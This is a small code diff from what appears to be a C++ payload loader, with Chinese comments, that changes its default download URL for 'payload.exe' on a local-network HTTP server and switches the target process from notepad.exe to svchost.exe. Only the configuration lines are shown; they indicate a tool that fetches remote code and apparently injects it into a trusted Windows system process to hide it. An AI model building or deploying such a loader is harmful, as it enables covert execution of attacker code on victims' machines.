@@ -9,8 +9,8 @@
  */
 int main(int argc, char* argv[]) {
     // 默认配置
-    std::string url = "http://192.168.110.132:8000/payload.exe"; 
-    std::string target = "C:\\Windows\\System32\\notepad.exe";
+    std::string url = "http://192.168.110.130:8000/payload.exe"; 
+    std::string target = "C:\\Windows\\System32\\svchost.exe";
 
     // 支持命令行参数覆盖默认配置
     if (argc > 1) {
